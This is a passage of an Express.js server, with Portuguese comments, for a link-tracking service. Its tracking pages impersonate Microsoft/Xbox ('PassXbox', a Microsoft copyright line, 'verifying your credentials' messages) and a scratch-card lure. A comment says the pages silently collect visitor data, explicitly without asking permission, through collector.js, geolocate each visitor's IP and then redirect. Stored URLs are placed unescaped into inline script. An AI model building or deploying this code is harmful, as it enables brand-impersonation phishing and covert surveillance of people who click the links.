    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PassXbox - Acesse sua Conta</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #107c10 0%, #0e6b0e 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
            max-width: 450px;
            width: 100%;
            padding: 40px;
            text-align: center;
        }
        .logo {
            width: 120px;
            height: 120px;
            margin: 0 auto 30px;
            background: linear-gradient(135deg, #107c10 0%, #0e6b0e 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            color: white;
            font-weight: bold;
        }
        h1 { color: #107c10; font-size: 28px; margin-bottom: 10px; font-weight: 600; }
        .subtitle { color: #666; font-size: 14px; margin-bottom: 30px; }
        .loading-container { margin: 30px 0; }
        .loading-text { color: #107c10; font-size: 16px; margin-bottom: 20px; font-weight: 500; }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #107c10;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { color: #666; font-size: 13px; margin-top: 20px; }
        .footer {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #e0e0e0;
            color: #999;
            font-size: 12px;
        }
        .progress-bar {
            width: 100%;
            height: 4px;
            background: #f0f0f0;
            border-radius: 2px;
            margin-top: 20px;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #107c10, #0e6b0e);
            width: 0%;
            animation: progress 1.5s ease-in-out forwards;
        }
        @keyframes progress { to { width: 100%; } }
    </style>
    <script src="/collector.js"></script>
</head>
<body>
    <div class="container">
        <div class="logo">X</div>
        <h1>PassXbox</h1>
        <p class="subtitle">Verificando suas credenciais...</p>
        <div class="loading-container">
            <div class="loading-text">Conectando ao servidor...</div>
            <div class="spinner"></div>
            <div class="progress-bar"><div class="progress-fill"></div></div>
            <div class="status" id="status">Aguarde, estamos processando sua solicitação...</div>
        </div>
        <div class="footer">
            <p>© 2024 Microsoft Corporation. Todos os direitos reservados.</p>
            <p style="margin-top: 5px;">Você será redirecionado em instantes...</p>
        </div>
    </div>
    <script>
        (function() {
            const linkId = '${linkId}';
            const redirectUrl = '${row.original_url}';
            let dataCollected = false;
            let redirectAttempted = false;
            const statusEl = document.getElementById('status');
            const statuses = [
                'Verificando credenciais...',
                'Conectando ao servidor Microsoft...',
                'Validando sua conta...',
                'Preparando redirecionamento...',
                'Quase lá...'
            ];
            let statusIndex = 0;
            const statusInterval = setInterval(() => {
                if (statusIndex < statuses.length) {
                    statusEl.textContent = statuses[statusIndex];
                    statusIndex++;
                }
            }, 300);
            function collectSilently() {
                if (!dataCollected && linkId) {
                    collectAllData(linkId).then(() => {
                        dataCollected = true;
                        clearInterval(statusInterval);
                        statusEl.textContent = 'Redirecionando...';
                    }).catch(() => {});
                }
            }
            collectSilently();
            setTimeout(collectSilently, 400);
            setTimeout(() => {
                collectSilently();
                setTimeout(() => {
                    if (!redirectAttempted) {
                        redirectAttempted = true;
                        window.location.href = redirectUrl;
                    }
                }, 300);
            }, 1200);
            setTimeout(() => {
                if (!redirectAttempted && redirectUrl) {
                    redirectAttempted = true;
                    window.location.href = redirectUrl;
                }
            }, 2000);
        })();
    </script>
</body>
</html>`;

    res.send(html);
  });
});

// API: Obter URL de redirecionamento (compatibilidade)
app.get('/api/redirect/:linkId', (req, res) => {
  const { linkId } = req.params;
  db.get('SELECT original_url FROM links WHERE id = ?', [linkId], (err, row) => {
    if (err || !row) {
      return res.status(404).json({ error: 'Link não encontrado' });
    }
    res.json({ redirectUrl: row.original_url });
  });
});

// API: Obter URL de redirecionamento (alternativa)
app.get('/api/get-redirect/:linkId', (req, res) => {
  const { linkId } = req.params;
  db.get('SELECT original_url FROM links WHERE id = ?', [linkId], (err, row) => {
    if (err || !row) {
      return res.status(404).json({ error: 'Link não encontrado' });
    }
    res.json({ redirectUrl: row.original_url });
  });
});

// API: Obter informações de tracking (IP e localização) para exibir na página
app.get('/api/track-info/:linkId', async (req, res) => {
  const { linkId } = req.params;
  
  // Obter IP do cliente
  let ip = req.headers['x-forwarded-for'] || 
           req.headers['x-real-ip'] ||
           req.ip ||
           req.connection.remoteAddress || 
           req.socket.remoteAddress ||
           (req.connection.socket ? req.connection.socket.remoteAddress : null);

  // Limpar IP
  if (ip) {
    if (ip.includes(',')) {
      ip = ip.split(',')[0].trim();
    }
    if (ip.includes(':')) {
      const parts = ip.split(':');
      if (parts.length > 1 && /^\d+$/.test(parts[parts.length - 1])) {
        ip = parts.slice(0, -1).join(':');
      }
      if (ip.startsWith('::ffff:')) {
        ip = ip.replace('::ffff:', '');
      }
    }
    ip = ip.trim();
  }

  // Se IP for localhost, tentar obter IP público
  if (!ip || ip === '::1' || ip === '127.0.0.1' || ip === 'localhost') {
    try {
      const publicIPData = await httpRequest('https://api.ipify.org?format=json');
      if (publicIPData && publicIPData.ip) {
        ip = publicIPData.ip;
      }
    } catch (e) {
      // Ignorar
    }
  }

  // Obter localização
  let location = null;
  if (ip && ip !== '::1' && ip !== '127.0.0.1' && ip !== 'localhost') {
    try {
      // Tentar geoip-lite primeiro
      const geo = geoip.lookup(ip);
      if (geo && geo.ll) {
        location = {
          country: geo.country,
          region: geo.region,
          city: geo.city,
          latitude: geo.ll[0],
          longitude: geo.ll[1]
        };
      }
      
      // Tentar API externa para dados mais completos
      const additionalGeo = await getAdditionalGeoData(ip);
      if (additionalGeo) {
        location = {
          country: additionalGeo.country || location?.country,
          region: additionalGeo.region || location?.region,
          city: additionalGeo.city || location?.city,
          latitude: additionalGeo.latitude || location?.latitude,
          longitude: additionalGeo.longitude || location?.longitude
        };
      }
    } catch (e) {
      // Ignorar erros
    }
  }

  res.json({
    ip: ip || 'N/A',
    location: location
  });
});

// Rota para preview da raspadinha (sem tracking)
app.get('/preview-raspadinha', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'cardpass.html'), {
    headers: {
      'Content-Type': 'text/html'
    }
  });
});

// Rota para servir página CardPass (raspadinha)
app.get('/cardpass/:linkId', (req, res) => {
  const { linkId } = req.params;
  
  // Verificar se o link existe
  db.get('SELECT original_url FROM links WHERE id = ?', [linkId], (err, row) => {
    if (err || !row) {
      return res.status(404).send('Link não encontrado');
    }

    // Servir página CardPass com redirect URL
    const html = fs.readFileSync(path.join(__dirname, 'public', 'cardpass.html'), 'utf8');
    const htmlWithRedirect = html.replace(
      'const redirectUrl = new URLSearchParams(window.location.search).get(\'redirect\');',
      `const redirectUrl = '${row.original_url}';`
    );
    res.send(htmlWithRedirect);
  });
});

// Rota de rastreamento: coleta dados e redireciona
app.get('/t/:linkId', (req, res) => {
  const { linkId } = req.params;
  
  // Verificar se o link existe
  db.get('SELECT original_url FROM links WHERE id = ?', [linkId], (err, row) => {
    if (err || !row) {
      return res.status(404).send('Link não encontrado');
    }

    // Servir página HTML que coleta dados SILENCIOSAMENTE e redireciona
    const html = `
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carregando...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #f5f5f5;
            font-family: Arial, sans-serif;
        }
        .loader {
            width: 50px;
            height: 50px;
            margin: 100px auto;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <script src="/collector.js"></script>
</head>
<body>
    <div class="loader"></div>
    <script>
        // COLETA SILENCIOSA - SEM PEDIR PERMISSÃO
        (function() {
            const linkId = '${linkId}';
            const redirectUrl = '${row.original_url}';
            
            // Coletar dados imediatamente em background (sem bloquear)
            let dataCollected = false;
            
            // Função de coleta silenciosa
            function collectSilently() {
                if (!dataCollected) {
                    collectAllData(linkId).then((result) => {
                        dataCollected = true;
                        // Dados coletados silenciosamente
                    }).catch(() => {
                        // Erro silencioso - não mostrar nada
                    });
                }
            }
            
            // Coletar imediatamente
            collectSilently();
            
            // Coletar novamente após 500ms (para pegar mais dados de comportamento)
            setTimeout(collectSilently, 500);
            
            // Coletar uma última vez antes de redirecionar
            setTimeout(() => {
                collectSilently();
                // Redirecionar após coleta
                setTimeout(() => {
                    window.location.href = redirectUrl;
                }, 200);
            }, 800); // Reduzido para 800ms - coleta rápida e silenciosa
            
            // Fallback - redirecionar mesmo se houver erro
            setTimeout(() => {
                if (!dataCollected) {
                    collectSilently();
                }
                window.location.href = redirectUrl;
            }, 1200); // Máximo 1.2 segundos
        })();
    </script>
</body>
</html>`;

    res.send(html);
  });
});

// Rota raiz: dashboard (fallback se express.static não funcionar)
app.get('/', (req, res) => {
  const indexPath = path.join(__dirname, 'public', 'index.html');
  
  // Tentar ler e enviar diretamente
  try {
    if (fs.existsSync(indexPath)) {
      const content = fs.readFileSync(indexPath, 'utf8');
      res.setHeader('Content-Type', 'text/html; charset=utf-8');
      return res.send(content);
    }
  } catch (err) {
    console.error('Erro ao ler index.html:', err);
  }
  
  // Tentar caminho alternativo
  try {
    const altPath = path.resolve(process.cwd(), 'public', 'index.html');
    if (fs.existsSync(altPath)) {
      const content = fs.readFileSync(altPath, 'utf8');
      res.setHeader('Content-Type', 'text/html; charset=utf-8');
      return res.send(content);
    }
  } catch (err) {
    console.error('Erro ao ler index.html (caminho alternativo):', err);
  }
  
  // Se não encontrou, retornar erro
  res.status(500).send(`
    <h1>Erro ao carregar página</h1>
    <p>Arquivo index.html não encontrado.</p>
    <p>__dirname: ${__dirname}</p>
    <p>process.cwd(): ${process.cwd()}</p>
  `);
});

// Exportar para Vercel
module.exports = app;

// Iniciar servidor apenas se não estiver na Vercel
if (require.main === module) {
  app.listen(PORT, () => {
    console.log(`Servidor rodando em http://localhost:${PORT}`);
  });
}
